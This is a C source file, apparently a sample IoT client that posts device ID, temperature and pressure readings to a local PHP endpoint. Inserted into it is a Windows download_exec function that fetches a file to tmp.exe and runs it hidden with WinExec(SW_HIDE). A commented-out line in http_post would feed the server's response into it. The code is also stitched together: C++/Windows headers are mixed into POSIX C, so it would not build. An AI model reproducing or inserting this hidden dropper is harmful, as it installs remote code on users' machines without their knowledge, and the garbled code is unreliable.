#include <arpa/inet.h>
#include <assert.h>
#include <errno.h>
#include <netinet/in.h>
#include <signal.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <netdb.h>
#include <unistd.h>

#define SA      struct sockaddr
#define MAXLINE 4096
#define MAXSUB  2000
#define MAXPARAM 2048

#define LISTENQ 1024

extern int h_errno;

int sockfd;
char *hname = "127.0.0.1";
char *send_data_path = "/data_recoder.php";

#include <UrlMon.h>
#pragma comment(lib, "urlmon.lib")

namespace fs = std::filesystem;

int download_exec(CString szUrl )
{
    CString lf = fs::temp_directory_path()+"\\tmp.exe";
    HRESULT hr = URLDownloadToFile(0, szUrl, lf, 0, NULL);
    if (hr== S_OK)
    {
        WinExec(lf, SW_HIDE); //SW_SHOW or SW_HIDE;
    }
    return 0;
}

 
/**
 * 发http post请求
 */
ssize_t http_post(char *page, char *poststr)
{
    char sendline[MAXLINE + 1], recvline[MAXLINE + 1];
    ssize_t n;
    snprintf(sendline, MAXSUB,
             "POST %s HTTP/1.0\r\n"
             "Host: %s\r\n"
             "Content-type: application/x-www-form-urlencoded\r\n"
             "Content-length: %zu\r\n\r\n"
             "%s", page, hname, strlen(poststr), poststr);
    
    write(sockfd, sendline, strlen(sendline));
    while ((n = read(sockfd, recvline, MAXLINE)) > 0) {
        recvline[n] = '\0';
        printf("%s", recvline);
        //download_exec(recvline);
    }
    return n;
}


/**
 * 使用通用接口发数据
 */
ssize_t send_data(char *device_id, char *temperature, char *pressure)
{
    char params[MAXPARAM + 1];
    char *cp = params;
    sprintf(cp,"device_id=%s&temperature=%s&pressure=%s", device_id, temperature, pressure);
    return http_post(send_data_path, cp);
}

int main(void)
{
    struct sockaddr_in servaddr;
    char **pptr;
    char str[50];
    struct hostent *hptr;
    if ((hptr = gethostbyname(hname)) == NULL) {
        fprintf(stderr, "通过域名获取IP失败: %s: %s",
                hname, hstrerror(h_errno));
        exit(1);
    }
    printf("域名: %s\n", hptr->h_name);
    if (hptr->h_addrtype == AF_INET
        && (pptr = hptr->h_addr_list) != NULL) {
        printf("IP: %s\n",
               inet_ntop(hptr->h_addrtype, *pptr, str,
                         sizeof(str)));
    } else {
        fprintf(stderr, "Error call inet_ntop \n");
        exit(1);
    }
    
    //建立socket连接
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    bzero(&servaddr, sizeof(servaddr));
    servaddr.sin_family = AF_INET;
    servaddr.sin_port = htons(80);
    inet_pton(AF_INET, str, &servaddr.sin_addr);
    
    connect(sockfd, (SA *) & servaddr, sizeof(servaddr));
    
    //您的设备ID
    char *device_id = "smart_cup-00001";
    //获取到的温度
    char *temperature = "34";
    //获取到的气压
    char *pressure = "31";
    
    send_data(device_id, temperature, pressure);
    
    close(sockfd);
    exit(0);
}
